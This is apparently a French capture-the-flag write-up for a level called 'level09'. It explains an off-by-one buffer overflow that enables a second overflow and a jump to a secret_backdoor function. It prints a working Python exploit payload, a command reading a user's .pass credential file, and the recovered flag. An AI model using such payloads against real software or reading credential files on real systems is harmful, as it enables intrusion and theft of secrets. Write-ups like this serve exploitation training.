1. Buffer overflow sur la fct set_username de 1 byte. L'espace memoire se trouvant a user+40 est la longueur du message. On peut donc modifier cette valeur afin de creer un second buffer overflow sur message.

```
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

2. L'offset est de 200 apres l'username.

```
(python -c '''
import struct

addrs = struct.pack("Q", 0x55555555488c)
junk = "\x90" * 200

print "A" * 40 + "\xee" + "\n" + junk + addrs
'''; cat;) | ./level09
```

```
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

> Flag: j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
